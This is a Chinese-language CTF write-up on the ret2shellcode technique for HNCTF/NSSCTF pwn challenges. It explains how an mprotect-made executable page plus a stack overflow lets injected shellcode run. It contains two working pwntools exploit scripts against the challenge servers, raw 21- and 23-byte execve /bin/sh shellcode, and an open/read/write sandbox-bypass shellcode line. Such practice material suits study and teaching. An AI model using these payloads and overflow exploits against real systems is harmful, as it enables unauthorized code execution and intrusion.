## ret2shellcode

### 1. 知识点：写入shellcode后执行

题目：[[HNCTF 2022 Week1\]ret2shellcode | NSSCTF](https://www.nssctf.cn/problem/2934)

1. 各种保护的说明：

   ![image-20240531115932464](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311159529.png)

1. 进入到程序中，没有发现后门函数，且程序开启了保护，堆栈不可执行：

   ![image-20240531115738496](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311157536.png)

   ![image-20240531115715835](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311157881.png)

2. 程序中存在一个mprotect函数，可以用来修改内存页面的权限，其更改了stdout所在内存页面的权限，变为可读、可写、可执行：

   ![image-20240531120045841](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311200905.png)

3. 可以利用写、执行权限，在相应页面 **写入shellcode代码** ，然后 **挟持IP** 跳转到该页面 **执行写入的shellcode代码** ：

   * shellcode代码，即(类似于 **call system("bin/sh/")** )，可由攻击生成 **asm(shellcraft.sh())**，后面计算栈溢出的偏移（用来填充shellcode溢出到返回值），和写入shellcode代码处的地址即可构造出payload：

   * EXP，在64位下context调试信息中arch要使用 **'amd64'** ，而在 **32位** 下应该使用 **'i386'**，：两种架构下的 **shellcode代码** 时不同的 

     ![image-20240531121029708](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311210752.png)

     ``````python
     #!/usr/bin/env python
     from pwn import *
     context(os='linux', arch='amd64', log_level='debug')
     sh = remote('node5.anna.nssctf.cn',23539)
     shellcode = asm(shellcraft.sh())
     print(shellcode)
     buf2_addr = 0x4040A0
     #.ljust(0x108, b'A')用来填充sellcode，便于后面溢出到返回值
     sh.sendline(shellcode.ljust(0x108, b'A') + p64(buf2_addr))
     sh.sendline(b'cat flag')
     sh.interactive()
     
     ``````




### 2. 读入shellcode的空间不足

**注意** ：程序可能会再读入shellcode时设置较小的范围，导致shellcraft生成的44个字节不能全部写入，这是需要较短的字节吗

1. **32位shellcode** 短字节(21字节)：\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
2. **64位的shellcode** 短字节(23字节)：\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

3. **过沙盒的shellcode** ：

   ```python
   asm(shellcraft.open("./flag") + shellcraft.read(3, flag_addr, 0x30) + shellcraft.write(1, flag_addr, 0x30))
   ```

   

4. ida中可见读入的数据时有长度限制的，只能读入37个字节：

   ![image-20240702144850822](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021448879.png)

5. 所以要使用短字节，EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   # p = process("./pwn")
   p = remote("node4.anna.nssctf.cn",28055)   
   elf = ELF("./pwn")
   
   p.recvuntil(b"Please.")
   shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
   p.sendline(shellcode)
   
   p.recvuntil(b"Let's start!")
   payload = b'a'*(0xa+8)+p64(0x6010A0)
   p.sendline(payload)
   p.sendline(b'cat flag')
   # 与远程交互
   p.interactive()
   
   ```

   